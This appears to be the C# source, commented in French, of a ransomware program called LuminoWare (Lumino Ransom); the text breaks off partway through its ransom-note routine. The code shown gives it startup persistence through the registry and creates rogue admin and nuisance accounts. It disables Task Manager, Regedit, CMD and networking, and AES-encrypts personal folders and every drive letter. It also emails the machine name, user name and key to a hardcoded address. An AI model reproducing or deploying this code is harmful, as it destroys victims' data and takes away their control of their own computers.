
/*
      ___       ___           ___                       ___           ___                             ___           ___           ___           ___           ___           ___                     
     /\__\     /\__\         /\__\          ___        /\__\         /\  \                           /\  \         /\  \         /\__\         /\  \         /\  \         /\__\                    
    /:/  /    /:/  /        /::|  |        /\  \      /::|  |       /::\  \                         /::\  \       /::\  \       /::|  |       /::\  \       /::\  \       /::|  |                   
   /:/  /    /:/  /        /:|:|  |        \:\  \    /:|:|  |      /:/\:\  \                       /:/\:\  \     /:/\:\  \     /:|:|  |      /:/\ \  \     /:/\:\  \     /:|:|  |                   
  /:/  /    /:/  /  ___   /:/|:|__|__      /::\__\  /:/|:|  |__   /:/  \:\  \                     /::\~\:\  \   /::\~\:\  \   /:/|:|  |__   _\:\~\ \  \   /:/  \:\  \   /:/|:|__|__                 
 /:/__/    /:/__/  /\__\ /:/ |::::\__\  __/:/\/__/ /:/ |:| /\__\ /:/__/ \:\__\                   /:/\:\ \:\__\ /:/\:\ \:\__\ /:/ |:| /\__\ /\ \:\ \ \__\ /:/__/ \:\__\ /:/ |::::\__\                
 \:\  \    \:\  \ /:/  / \/__/~~/:/  / /\/:/  /    \/__|:|/:/  / \:\  \ /:/  /                   \/_|::\/:/  / \/__\:\/:/  / \/__|:|/:/  / \:\ \:\ \/__/ \:\  \ /:/  / \/__/~~/:/  /                
  \:\  \    \:\  /:/  /        /:/  /  \::/__/         |:/:/  /   \:\  /:/  /                       |:|::/  /       \::/  /      |:/:/  /   \:\ \:\__\    \:\  /:/  /        /:/  /                 
   \:\  \    \:\/:/  /        /:/  /    \:\__\         |::/  /     \:\/:/  /                        |:|\/__/        /:/  /       |::/  /     \:\/:/  /     \:\/:/  /        /:/  /                  
    \:\__\    \::/  /        /:/  /      \/__/         /:/  /       \::/  /                         |:|  |         /:/  /        /:/  /       \::/  /       \::/  /        /:/  /                   
     \/__/     \/__/         \/__/                     \/__/         \/__/                           \|__|         \/__/         \/__/         \/__/         \/__/         \/__/                    

     __ __             __     
    /\ \\ \          /'__`\   
    \ \ \\ \        /\ \/\ \  
     \ \ \\ \_      \ \ \ \ \ 
      \ \__ ,__\ __  \ \ \_\ \
       \/_/\_\_//\_\  \ \____/
          \/_/  \/_/   \/___/ 
                          
          

*/                                                  /*\********************************************************************\*/
using System;                                       /*|¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯|*/
using System.Linq;                                  /*|                                                                    |*/
using System.Text;                                  /*|                                                                    |*/
using System.Windows.Forms;                         /*|                                                                    |*/
using System.Security.Cryptography;                 /*|                  Directives using (bibliothèques)                  |*/
using System.IO;                                    /*|              necessaires au fonctionnement du programme            |*/
using System.Net.Mail;                              /*|       (à ne pas modifier sauf si vous savez ce que vous faites)    |*/
using System.Net;                                   /*|                                                                    |*/
using System.Runtime.InteropServices;               /*|                                                                    |*/
using GlobalHook;                                   /*|                                                                    |*/
using Microsoft.Win32;                              /*|                              LuminoWare                            |*/
using System.Diagnostics;                           /*|                  (ancienne Version: Lumino Ransom)                 |*/
using ASCII;                                        /*|                                                                    |*/
using CMD;                                          /*|                                                                    |*/
using animANDNCS;                                   /*|                                                                    |*/
using System.Drawing;                               /*|                                                                    |*/
using System.Collections;                           /*|                                                                    |*/
using Lumino_ransom.Properties;                     /*|                                                                    |*/
using Brushes = System.Drawing.Brushes;             /*|                                                            Lumino© |*/ 
                                                    /*|____________________________________________________________________|*/
                                                    /*\********************************************************************\*/



namespace Lumino_ransom
{
    public partial class Form1 : Form
    { 
        readonly System.Media.SoundPlayer Music = new System.Media.SoundPlayer(Resources.Adele); // créer un objet SoundPlayer pour jouer la musique (Adele-Skyfall)
        readonly string userName = Environment.UserName;                                         // récupère le nom d'utilisateur
        readonly string computerName = System.Environment.MachineName.ToString();                // récupère le nom de l'ordinateur
        readonly string userDir = "C:\\Users\\";                                                 // chemin vers le dossier utilisateur

        private const int WS_SYSMENU = 0x80000;                                                  // constante pour désactiver le bouton fermer

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        protected override CreateParams CreateParams // désactive le bouton fermer
        {
            get 
            {
                CreateParams cp = base.CreateParams;  // récupère les paramètres de la fenêtre
                cp.Style &= ~WS_SYSMENU;              // désactive le bouton fermer
                return cp;                            // retourne les paramètres de la fenêtre
            }
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public Form1()
        {

            this.WindowState = FormWindowState.Minimized;                   // minimise la fenêtre
            InitializeComponent();                                          // initialisation des composants de l'applications
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        private void Form1_Load(object sender, EventArgs e) // au chargement de la fenêtre
        {
            Opacity = 0;                                                   // rend la fenêtre transparente
            this.ShowInTaskbar = false;                                    // cache la fenêtre dans la barre des tâches

            StartAction();                                                 // lance la fonction StartAction

        }
        
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void StartAction() // Début
        {
            StartAction_Organisation(); // Lancer la fonction StartAction_Organisation
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public void StartAction_Organisation()
        {
            try
            {

                /* 1er Partie: Changement du curseur de Windows                                                                                                     //#                                                                                                                                                                           */
                string UserPass = CreatePassword(5);                                                                                                               // Création d'un mot de passe random de 5 caractères de l'utilisateur Lumino_Ransom -------------------------------------------------------------------------------------------|             
                string password = CreatePassword(15);                                                                                                             // Création d'un mot de passe random de 15 caractères qui sera encrypté par le ransomware                                                                                       |
                string path = "\\Desktop";                                                                                                                       // Définir le chemin du bureau de l'utilisateur dans "path"                                                                                                                      |
                string startPath = userDir + userName + path;                                                                                                   // Définir le chemin entier jusqu'au bureau de l'utilisateur dans "startPath"                                                                                                     |
                string cbCursorSize = "10";                                                                                                                    // Définir la taille du curseur dans "cbCursorSize"                                                                                                                                | --> Changement du curseur de l'utilisateur
                int cursorSize = Int32.Parse(cbCursorSize);                                                                                                   // Converti la taille du curseur en Int32 (int) dans "cursorSize"                                                                                                                   |
                int parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);                                                                                       // Effectue un calcul sur la taille du curseur pour la rendre compatible avec le système d'exploitation                                                                              |
                SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);                                                                              // Change la taille du curseur sur le système d'exploitation avec "SystemParametersInfo" et les paramètres définis ci-dessus                                                          |
                Cursor_Changer();                                                                                                                          // Change le curseur de l'utilisateur avec la fonction "Cursor_Changer" ---------------------------------------------------------------------------------------------------------------|
                /*                                                                                                                                        // #                                                                                                                                                                                    */
                /* 2eme Partie: Embêter l'utilisateur                                                                                                    // #                                                                                                                                                                                     */
                CreateUser_Admin(UserPass);                                                                                                             // Création d'un utilisateur 'Lumino_Ransom' avec le mot de passe random de 5 caractères -------------------------------------------------------------------------------------------------|
                CMD.Users_Chiants(400);                                                                                                                // Création de 400 utilisateurs ["Lumino2.0-YT-" 1-400] et des mots de passe défini à Lumine-S                                                                                             |
                System.Threading.Thread.Sleep(2000);                                                                                                  // Attendre 2 secondes                                                                                                                                                                      |   
                anim_NCS.Del_NCS_Ani();                                                                                                              // Mettre l'animation + son (Bip) sur les Led : Num, Caps et Scroll [ animation lente ]                                                                                                      |                                                        
                System.Threading.Thread.Sleep(2000);                                                                                                // Attendre 2 secondes                                                                                                                                                                        |
                Ascii.ASCII_Art();                                                                                                                 // Affiche l'ASCII Art                                                                                                                                                                         |--> Embêter l'utilisateur avec des sons, des animations, des effets, des messages, etc... + Rendre l'ordinateur lent
                Music.Play();                                                                                                                     // Joue la musique défini [Adele-Skyfall]                                                                                                                                                       |
                Vertex_Main();                                                                                                                   // Affiche la fenêtre Vertex (blocage de l'explorer par des rectangle de couleurs R-G-B)                                                                                                         |
                timer2.Start();                                                                                                                 // Démarre le timer2 ( timer2 = mettre des icones dans la souris en Bug)                                                                                                                          |
                System.Threading.Thread.Sleep(2000);                                                                                           // Attendre 2 secondes                                                                                                                                                                             |
                CMD.Registry_Copy();                                                                                                          // Créer un dossier 'win64-loader' et copie le virus dedans, ensuite, il va mettre une clé de registre pour se lancer au démarrage de Windows ------------------------------------------------------|
                /*                                                                                                                           // #                                                                                                                                                                                                 */
                /* 3eme Partie: Cypter-Envoyer-Limiter (C.E.L) Part1 + Embêter l'utilisateur (timer4)                                       // #                                                                                                                                                                                                  */
                timer4.Start();                                                                                                            // Démarre le timer4 ( timer4 = copier une partie de m'écran, inverser les couleurs et l'afficher sur l'écran au hasard) ------------------------------------------------------------------------------|
                System.Threading.Thread.Sleep(2000);                                                                                      // Attendre 2 secondes                                                                                                                                                                                  |
                Disable.Disble_Taskmgr();                                                                                                // Désactive le gestionnaire de tâches                                                                                                                                                                   |
                System.Threading.Thread.Sleep(2000);                                                                                    // Attendre 2 secondes                                                                                                                                                                                    |
                Disable.Disble_Registry();                                                                                             // Désactive le registre                                                                                                                                                                                   | ---| on met un autre timer (4) pour embêter l'utilisateur + Crypter les dossiers (Crypter) + Envoyer le mot de passe (Enovoyer)/ Embêter l'utilisateur   | C.E.L
                Disable.Disable_Parameter();                                                                                          // Désactive les paramètres                                                                                                                                                                                 | ---| on désactive les paramètres/gestionnaire des taches/Registre (Regedit) pour que l'utilisateur ne puisse pas les modifier (Limiter)                  |
                System.Threading.Thread.Sleep(2000);                                                                                 // Attendre 2 secondes                                                                                                                                                                                       |
                SendPassword(password, UserPass);                                                                                   // Envoie le mot de passe encrypté et le mot de passe random de 5 caractères à l'adresse mail défini (ware.ransom@yahoo.com)                                                                                  |
                System.Threading.Thread.Sleep(2000);                                                                               // Attendre 2 secondes                                                                                                                                                                                         |
                Pass_crypter();                                                                                                   // Crypter les dossiers personnalisés --------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
                /*                                                                                                               // #                                                                                                                                                                                                             */
                /* 4eme Partie: Embêter l'utilisateur (timer3) + Cypter-Envoyer-Limiter (C.E.L) Part2 -> Limiter                // #                                                                                                                                                                                                              */
                timer3.Start();                                                                                                // Démarre le timer3 ( timer3 = inverser les couleurs de tout l'écran à des intervalles irréguliers) --------------------------------------------------------------------------------------------------------------|
                System.Threading.Thread.Sleep(2000);                                                                          // Attendre 2 secondes                                                                                                                                                                                              |
                FileLumine();                                                                                                // Créer 400 fichiers 'Lumine[1 à 400].[RIEN]'                                                                                                                                                                       |
                System.Threading.Thread.Sleep(2000);                                                                        // Attendre 2 secondes                                                                                                                                                                                                |
                Disable.Disble_CMD();                                                                                      // Désactive la commande CMD (le powershell est disponible MAIS pas en admin)                                                                                                                                          | --> on désactive le CMD, les paramètres et le gstionnaire des taches pour que l'utilisateur ne puisse pas l'utiliser afin de supprimer le Virus/Ransomware (Limiter) + Embêter l'utilisateur (timer3)
                System.Threading.Thread.Sleep(2000);                                                                      // Attendre 2 secondes                                                                                                                                                                                                  |
                CMD.CMD_rtc();                                                                                           // Mettre fin au processus (taskkill): CMD; Regedit(Registre); Taskmrg (Gestionnaires des taches)                                                                                                                        |
                System.Threading.Thread.Sleep(5000);                                                                    // Attendre 5 secondes                                                                                                                                                                                                    | 
                Disable.Internet_Dis();                                                                                // Désactive la connexion internet ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
                /*                                                                                                    // #                                                                                                                                                                                                                        */
                /* 5eme Partie: Libérer du visuel pour voir le message + message de signalement + Limiter (CMD_rtc)  // #                                                                                                                                                                                                                         */
                timer4.Stop();                                                                                      // Arrêter le timer4 (timer4 = copier une partie de m'écran, inverser les couleurs et l'afficher sur l'écran au hasard) ------------------------------------------------------------------------------------------------------|
                Programtxt();                                                                                      // Ouvrir le bloc note (notepad.exe)                                                                                                                                                                                           |
                Send_keys();                                                                                      // Ecrire un message (en simulant l'appuie de touches) à l'utilisateur dans le bloc note pour lui dire que son ordinateur est crypté et qu'il doit envoyer un mail pour le débloquer (Je ne demande pas de cypto)               | ---| On stop le timer4 pour libérer du visuel pour voir le message + Limiter les problèmes (CMD_rtc)
                System.Threading.Thread.Sleep(2000);                                                             // Attendre 2 secondes                                                                                                                                                                                                           | ---| On ouvre le bloc note et on écrit un message à l'utilisateur pour qu'il sache que son ordinateur est crypté et qu'il doit envoyer un mail pour le débloquer (Signalement) 
                CMD.CMD_rtc();                                                                                  // Mettre fin au processus (taskkill): CMD; Regedit(Registre); Taskmrg (Gestionnaires des taches)                                                                                                                                 |
                System.Threading.Thread.Sleep(2000);                                                           // Attendre 2 secondes ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
                /*                                                                                            // #                                                                                                                                                                                                                                */
                /* 6eme Partie: Embêter l'utilisateur (timer1) + Animer les Led + Fin bouclé                 // #                                                                                                                                                                                                                                 */
                timer1.Start();                                                                             // Démarre le timer1 (timer1 = copier l'écran et le mettre un l'infini, comme le virus Memz) -----------------------------------------------------------------------------------------------------------------------------------------|
                anim_NCS.Del_NCS_Ani2();                                                                   // Mettre la deuxième animation + son (Bip) sur les Led : Num, Caps et Scroll [ animation plus rapide ]                                                                                                                                | ---| On démarre le timer1 pour embêter l'utilisateur et on met l'animation N°2 des Led (Num, Caps et Scroll) en son
                System.Threading.Thread.Sleep(2000);                                                      // Attendre 2 secondes                                                                                                                                                                                                                  | ---| On fini ce virus avec une boucle infini (Finish_infini) pour que ça ne ce termine jamais !
                Finish_infini();                                                                         // Aller à la fonction de fin (Finish_infini) qui est une boucle infini -----------------------------------------------------------------------------------------------------------------------------------------------------------------|
                

            }
            catch (System.Exception) { }; // Si une erreur survient, on ne fait rien

        }


        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes) // algorithme de cryptage AES
        {
            byte[] encryptedBytes = null;                                      // byte array qui contiendra les bytes cryptés
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };          // byte array qui contiendra les bytes de la clé de cryptage
            using (MemoryStream ms = new MemoryStream())                       // mettre les bytes cryptés dans un nouveau MemoryStream "ms"
            {
                using (RijndaelManaged AES = new RijndaelManaged())       // utiliser l'algorithme AES dans un nouveau RijndaelManaged
                {
                    AES.KeySize = 256;                                                                          // taille de la clé de cryptage
                    AES.BlockSize = 128;                                                                        // taille du bloc de cryptage

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);                           // utiliser la clé de cryptage et les bytes de la clé de cryptage pour créer une nouvelle clé de cryptage "key" avec 1000 iterations
                    AES.Key = key.GetBytes(AES.KeySize / 8);                                                    // utiliser la clé de cryptage "key" pour créer une nouvelle clé de cryptage AES avec la taille de la clé de cryptage 
                    AES.IV = key.GetBytes(AES.BlockSize / 8);                                                   // utiliser la clé de cryptage "key" pour créer un nouveau vecteur d'initialisation AES avec la taille du bloc de cryptage

                    AES.Mode = CipherMode.CBC;                                                                  // utiliser le mode de cryptage CBC

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))        // utiliser le CryptoStream "cs" pour crypter les bytesToBeEncrypted
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);                   // crypter les bytes a l'aide du CryptoStream "cs"
                        cs.Close();                                                                   // fermer le CryptoStream "cs"
                    }
                    encryptedBytes = ms.ToArray();                                                              // mettre les bytes cryptés dans le byte array "encryptedBytes"
                }
            }

            return encryptedBytes;                                              // retourner les bytes cryptés
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public string CreatePassword(int length) // Creer un mot de passe aleatoire
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"; // Caracteres autorises
            StringBuilder res = new StringBuilder();                                                      // Stringbuilder sert a creer le mot de passe
            Random rnd = new Random();                                                                    // Random pour creer des choix aleatoire de caracteres
            while (0 < length--)                                                                          // Tant que la longueur du mot de passe est superieur a 0
            {
                res.Append(valid[rnd.Next(valid.Length)]);                                      // Ajouter un caractere aleatoire a la fin du mot de passe
            }
            return res.ToString();                                                                       // Retourner le mot de passe
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        private void SendPassword(string password, string UserPass) // Envoyer le mot de passe par mail
        {
            try
            {
                string info = computerName + "-_-" + userName + "    PASS: " + password + "      User_Admin Pass: " + UserPass;  // Info a envoyer (Nom de l'ordinateur, Nom de l'utilisateur, Mot de passe)
                var fromAddress = new MailAddress("sender.lumino@yahoo.com", "Ransom");                                          // Adresse mail de l'expediteur (A changer)
                var toAddress = new MailAddress("ware.ransom@yahoo.com", "Ransom");                                              // Adresse mail du destinataire (A changer)
                const string fromPassword = "yotoutlemondec'estsqueezie";                                                        // Mot de passe de l'expediteur (A changer selon l'adresse mail de l'expediteur)
                const string subject = "Ransom_Key";                                                                             // Sujet du mail
                var smtp = new SmtpClient                                                                                        // Configuration du serveur SMTP
                {
                    Host = "smtp-mail.outlook.com",                                              // Choisir un serveur smtp (Google n'est plus disponible)
                    Port = 587,                                                                  // Port du serveur smtp
                    EnableSsl = true,                                                            // Activer le SSL (sécurité)
                    DeliveryMethod = SmtpDeliveryMethod.Network,                                 // Methode de livraison (SMTP)
                    UseDefaultCredentials = false,                                               // Utiliser les identifiants par defaut (false = non)
                    Credentials = new NetworkCredential("sender.lumino@gmail.com", fromPassword) // Adresse mail de l'expediteur (A changer)

                };
                using (var message = new MailMessage(fromAddress, toAddress)                                                     // Creation du message
                {
                    Subject = subject,                                                          // Sujet du mail = "Ransom_Key" (variable 'subject')
                    Body = info                                                                 // Corps du mail = "info" (variable 'info')
                })
                {
                    smtp.Send(message);                                                         // Envoi du mail avec les informations dans la variable 'message'
                }
            }
            catch (System.Net.Mail.SmtpException) { } // Si il y a une erreur (de configuration) dans le mail a envoyer, on ne fait rien
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public void EncryptFile(string file, string password) // Fonction d'encriptage des fichiers avec un mot de passe avec algorithme AES, il va aussi renommer le fichier en .lumino_locked
        {
            try
            {
                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);                           // Lecture du fichier et stockage dans un tableau de byte
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);                       // Convertion du mot de passe en tableau de byte


                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);                   // Hashage du mot de passe avec SHA256

                byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);       // Appel de la fonction AES_Encrypt pour crypter le fichier avec le mot de passe

                File.WriteAllBytes(file, bytesEncrypted);                                    // Ecriture du fichier crypté
                System.IO.File.Move(file, file + ".lumino_locked");                          // Renommage du fichier en .lumino_locked
            }
            catch (System.IO.IOException) { }; // Si le fichier est ouvert ou autre problème de 'IO', on ignore l'erreur

        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void Pass_crypter() // Fonction qui va crypter les fichiers de chaque répertoire défini avec un mot de passe aléatoire
        {
            try
            {
                string password = CreatePassword(15);                                      // Création du mot de passe aléatoire de 15 caractères

                string startPath = userDir + userName + "\\Documents";                     // Chemin du répertoire/Dossier Documents--------------------------------------------------------------------------------------------------------------------------------------|
                string startPath2 = userDir + userName + "\\Desktop";                      // Chemin du répertoire/Dossier Desktop                                                                                                                                        |
                string startPath3 = userDir + userName + "\\Pictures";                     // Chemin du répertoire/Dossier Pictures                                                                                                                                       |---| Dossiers 'personnels' de l'utilisateur
                string startPath4 = userDir + userName + "\\Videos";                       // Chemin du répertoire/Dossier Videos                                                                                                                                         |---|         qui vont être crypté
                string startPath5 = userDir + userName + "\\Music";                        // Chemin du répertoire/Dossier Music                                                                                                                                          |
                string startPath6 = userDir + userName + "\\Downloads";                    // Chemin du répertoire/Dossier Downloads--------------------------------------------------------------------------------------------------------------------------------------|

                EncryptDirectory(startPath, password);                                     // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "startPath" ---|
                EncryptDirectory(startPath2, password);                                    // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "startPath2"   |
                EncryptDirectory(startPath3, password);                                    // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "startPath3"   |---| Encyption de chaque répertoire 'Personnel' de l'utilisateur
                EncryptDirectory(startPath4, password);                                    // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "startPath4"   |---|          qui contient des fichiers 'importants'
                EncryptDirectory(startPath5, password);                                    // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "startPath5"   |
                EncryptDirectory(startPath6, password);                                    // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "startPath6"---|
                
                EncryptDirectory("A:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "A:\\"---------|
                EncryptDirectory("B:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "B:\\"         |
                EncryptDirectory("C:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "C:\\"         |
                EncryptDirectory("D:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "D:\\"         |
                EncryptDirectory("E:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "E:\\"         |
                EncryptDirectory("F:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "F:\\"         |
                EncryptDirectory("G:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "G:\\"         |
                EncryptDirectory("H:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "H:\\"         |
                EncryptDirectory("I:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "I:\\"         |
                EncryptDirectory("J:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "J:\\"         |
                EncryptDirectory("K:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "K:\\"         |
                EncryptDirectory("L:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "L:\\"         |
                EncryptDirectory("M:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "M:\\"         |---| Encyption de toutes les partitions de l'ordinateur qui ont une lettre de A à Z et partitionnées par Windows
                EncryptDirectory("N:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "N:\\"         |---|                 (Linux: /dev/sda1 --> ✖ | Mac: /dev/disk0s1 --> ✖ | C:\Windows\ --> ✔)
                EncryptDirectory("O:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "O:\\"         |
                EncryptDirectory("P:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "P:\\"         |
                EncryptDirectory("Q:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "Q:\\"         |
                EncryptDirectory("R:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "R:\\"         |
                EncryptDirectory("S:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "S:\\"         |
                EncryptDirectory("T:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "T:\\"         |
                EncryptDirectory("U:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "U:\\"         |
                EncryptDirectory("V:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "V:\\"         |
                EncryptDirectory("W:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "W:\\"         |
                EncryptDirectory("X:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "X:\\"         |
                EncryptDirectory("Y:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "Y:\\"         |
                EncryptDirectory("Z:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "Z:\\"---------|
            }
            catch (System.UnauthorizedAccessException) { }    // Si le programme n'a pas les droits d'accès au répertoire, il ne fait rien
            catch (System.IO.DirectoryNotFoundException) { }  // Si le répertoire n'existe pas ou n'est pas trouvé, il ne fait rien
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void EncryptDirectory(string location, string password) // Fonction qui encrypte les fichiers selon les extensions définies
        {
            try
            {
                //Extensions à crypter
                var validExtensions = new[]                                              // Définir les extensions à crypter sous forme de tableau
                {
              ".log", ".sys", ".dll", ".md", ".exe", ".lnk", ".JPG", ".h", ".c", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".ini", ".inf"
            };

                var files = Directory.GetFiles(location);                               // Récupérer les fichiers à partir du chemin spécifié ("location") et les stocker dans un tableau ("files")
                string[] childDirectories = Directory.GetDirectories(location);         // Récupérer les dossiers à partir du chemin spécifié ("location") et les stocker dans un tableau ("childDirectories")
                for (int i = 0; i < files.Length; i++)                                  // Boucle pour parcourir le tableau "files"
                {
                    string extension = Path.GetExtension(files[i]);                     // Récupérer l'extension du fichier
                    if (validExtensions.Contains(extension))                            // Si l'extension du fichier est dans le tableau "validExtensions"
                    {
                        EncryptFile(files[i], password);                                // Lancer la fonction "EncryptFile" qui va crypter le fichier
                    }

                }
                for (int i = 0; i < childDirectories.Length; i++)                       // Boucle pour parcourir le tableau "childDirectories"
                {
                    EncryptDirectory(childDirectories[i], password);                    // Lancer la fonction "EncryptDirectory" qui va crypter le dossier
                } 
            }
            catch (System.IO.IOException) { }                                           // Si une erreur de type "IOException" (fichier) est détectée, on ne fait rien
            catch (System.UnauthorizedAccessException) { }                              // Si une erreur de type "UnauthorizedAccessException" (accès refusé) est détectée, on ne fait rien
        }


        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        [DllImport("user32")] // Importer la DLL user32.dll
        public static extern int SetCursorPos(int x, int y); // Définir la position de la souris


        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void Send_keys() // Simulation de pression de touche pour envoyer le message dans le bloc-note
        {
            try
            {
                SetCursorPos(500, 615);                                                                                                                                                                                                                                                                                                                                                                                                 // Mettre la souris sur le bloc-note (pour que le message s'envoie dans le bloc-note) avec la position définie
                this._gHook.Start_mouse();                                                                                                                                                                                                                                                                                                                                                                                              // Démarrer le hook de la souris (pour que la souris ne bouge plus)
                SendKeys.Send("EN: {ENTER}Hi !!! {ENTER}Your file was encrypted by the ransomware: Lumino_Ransom, if you want to decrypt him, send me à mail with the user name pc at ware.ransom@yahoo.com and I give to you the password (for free ;) that you need to enter in Lumino_decrypt ! On the other hand, you have no luck, it's the Hard's version of my Ransomware that I've created then... {ENTER} {ENTER}");           // Envoyer le message de signalement de la contamination + mail dans le bloc-note (Version Anglaise)
